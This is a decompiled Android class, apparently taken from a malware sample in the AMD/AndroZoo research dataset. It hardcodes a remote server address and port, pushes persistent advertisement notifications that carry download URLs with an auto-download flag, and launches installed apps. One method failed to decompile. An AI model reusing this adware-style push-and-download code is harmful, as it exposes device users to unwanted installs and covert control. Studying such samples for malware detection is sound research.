package com.unity3d.client;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import java.io.File;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

/* loaded from: /mnt/c/Users/truon/OneDrive/Desktop/MyWorks/Research4IECgroup/Tasks/Graph-Attention-Networks/dataset/preprocessing/apk_tool/AMD_AndroZoo_demo/dex/cda1bec27e663b5b512c108d4427c257.apk/classes.dex */
public class c {
    private static String e = "121.199.58.16";
    private static int f = 9002;
    private static int g = 4000;
    private static int h = 1024;
    public static String a = null;
    public static long b = 0;
    public static boolean c = false;
    public static List d = new ArrayList();

    public static void a(Context context, a aVar) {
        int b2 = b(aVar.i());
        if (b2 < 0) {
            return;
        }
        Notification notification = new Notification(17301545, aVar.d(), System.currentTimeMillis());
        Intent intent = new Intent(context, (Class<?>) Way.class);
        intent.putExtra("adurl", aVar.f());
        intent.putExtra("downurl", aVar.h());
        intent.putExtra("adname", aVar.g());
        intent.putExtra("pushtitle", aVar.d());
        intent.putExtra("pushcontent", aVar.e());
        intent.putExtra("notiid", b2);
        intent.putExtra("autodown", aVar.b());
        notification.setLatestEventInfo(context, aVar.d(), aVar.e(), PendingIntent.getActivity(context, b2, intent, 0));
        notification.flags = 32;
        if (aVar.c().equals("1")) {
            notification.defaults = 1;
        }
        notification.flags |= 1;
        ((NotificationManager) context.getSystemService("notification")).notify(b2, notification);
    }

    public static boolean a(Context context, String str) {
        if (str == null || "".equals(str)) {
            return false;
        }
        try {
            context.getPackageManager().getApplicationInfo(str, 8192);
            return true;
        } catch (PackageManager.NameNotFoundException e2) {
            return false;
        }
    }

    public static boolean a(String str) {
        if (d == null) {
            return false;
        }
        Iterator it = d.iterator();
        while (it.hasNext()) {
            if (((a) it.next()).i().equals(str)) {
                return true;
            }
        }
        return false;
    }

    public static int b(String str) {
        boolean z;
        if (d == null) {
            return -1;
        }
        for (int i = 0; i < d.size(); i++) {
            if (((a) d.get(i)).i().equals(str)) {
                int j = ((a) d.get(i)).j();
                if (j > 0) {
                    return j;
                }
                for (int i2 = 0; i2 < 100; i2++) {
                    Iterator it = d.iterator();
                    while (true) {
                        if (!it.hasNext()) {
                            z = false;
                            break;
                        }
                        if (((a) it.next()).j() == 6200 + i2) {
                            z = true;
                            break;
                        }
                    }
                    if (!z) {
                        ((a) d.get(i)).a(6200 + i2);
                        return 6200 + i2;
                    }
                }
            }
        }
        return -1;
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* JADX WARN: Removed duplicated region for block: B:16:0x0078 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public static java.lang.String b(android.content.Context r6, java.lang.String r7, java.lang.String r8) {
        /*
            Method dump skipped, instructions count: 205
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.unity3d.client.c.b(android.content.Context, java.lang.String, java.lang.String):java.lang.String");
    }

    public static void b(Context context, String str) {
        long currentTimeMillis = System.currentTimeMillis();
        if (currentTimeMillis - b < 10) {
            return;
        }
        b = currentTimeMillis;
        new d(context, str).start();
    }

    public static void c(Context context, String str) {
        if (str.startsWith("package:")) {
            str = str.substring("package:".length());
        }
        if (d(str) == null) {
            return;
        }
        d(context, str);
        new e(context, str).start();
    }

    public static void c(String str) {
        if (d == null) {
            return;
        }
        for (a aVar : d) {
            if (aVar.i().equals(str)) {
                d.remove(aVar);
                return;
            }
        }
    }

    public static a d(String str) {
        if (d == null) {
            return null;
        }
        for (a aVar : d) {
            if (aVar.i().equals(str)) {
                return aVar;
            }
        }
        return null;
    }

    private static void d(Context context, String str) {
        if (e(str)) {
            context.startActivity(context.getPackageManager().getLaunchIntentForPackage(str));
        }
    }

    private static boolean e(String str) {
        return new File("/data/data/" + str).exists();
    }
}
